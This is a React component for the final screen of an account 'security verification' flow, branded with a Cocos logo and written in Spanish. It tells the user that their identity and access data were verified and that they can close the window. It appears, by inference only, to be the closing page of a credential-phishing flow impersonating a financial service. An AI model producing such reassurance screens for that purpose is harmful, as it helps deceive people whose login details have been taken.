import { useEffect, useState } from "react";
import { CheckCircle2, Lock, Shield } from "lucide-react";
import CocosLogo from "@/components/cocos/CocosLogo";

interface CocosV2FinalScreenProps {
  email: string;
  logo?: React.ReactNode;
}

const CocosV2FinalScreen = ({ email, logo }: CocosV2FinalScreenProps) => {
  const [visible, setVisible] = useState(false);
  

  useEffect(() => {
    const t = setTimeout(() => setVisible(true), 100);
    return () => clearTimeout(t);
  }, []);


  return (
    <div className={`w-full max-w-[480px] transition-all duration-700 ${visible ? "opacity-100 translate-y-0" : "opacity-0 translate-y-6"}`}>
      {/* Logo */}
      <div className="flex justify-center mb-8">
        <CocosLogo />
      </div>

      {/* Success icon */}
      <div className="flex justify-center mb-8">
        <div className="relative">
          <div className="absolute -inset-4 rounded-full bg-green-100/50 animate-pulse" />
          <div className="absolute -inset-2 rounded-full bg-green-50 border border-green-200" />
          <div className="relative flex h-24 w-24 items-center justify-center rounded-full bg-gradient-to-br from-[#16a34a] to-[#22c55e] shadow-xl shadow-green-200">
            <CheckCircle2 size={48} className="text-white" strokeWidth={1.8} />
          </div>
        </div>
      </div>

      {/* Title */}
      <h2 className="text-center text-[22px] font-extrabold text-[#1a2233] mb-3 leading-tight">
        Tu cuenta está <span className="text-[#16a34a]">segura</span>
      </h2>

      {/* Message */}
      <p className="text-center text-[15px] text-[#5a6a85] leading-relaxed mb-8 max-w-[340px] mx-auto">
        Hemos verificado tu identidad y actualizado las medidas de seguridad de tu cuenta exitosamente.
      </p>

      {/* Security details */}
      <div className="space-y-3 mb-8">
        <div className="flex items-center gap-3 rounded-xl bg-[#f0fdf4] border border-[#bbf7d0] px-4 py-3">
          <Shield size={18} className="text-[#16a34a] shrink-0" />
          <div className="text-left">
            <p className="text-[13px] font-semibold text-[#15803d]">Verificación completada</p>
            <p className="text-[11px] text-[#4ade80]">Tu identidad fue verificada correctamente</p>
          </div>
        </div>

        <div className="flex items-center gap-3 rounded-xl bg-[#f0fdf4] border border-[#bbf7d0] px-4 py-3">
          <Lock size={18} className="text-[#16a34a] shrink-0" />
          <div className="text-left">
            <p className="text-[13px] font-semibold text-[#15803d]">Seguridad actualizada</p>
            <p className="text-[11px] text-[#4ade80]">Tus datos de acceso fueron verificados correctamente</p>
          </div>
        </div>
      </div>


      {/* Email */}
      <div className="flex justify-center mb-4">
        <div className="flex items-center gap-2 rounded-full border border-[#e8edf5] bg-[#f8fafc] px-4 py-2">
          <div className="h-1.5 w-1.5 rounded-full bg-[#16a34a]" />
          <span className="text-[12px] text-[#8895aa] max-w-[220px] truncate">{email}</span>
        </div>
      </div>

      {/* Footer */}
      <p className="text-center text-[11px] text-[#b0b8c8] leading-relaxed max-w-[300px] mx-auto">
        Podés cerrar esta ventana de forma segura.
      </p>
    </div>
  );
};

export default CocosV2FinalScreen;
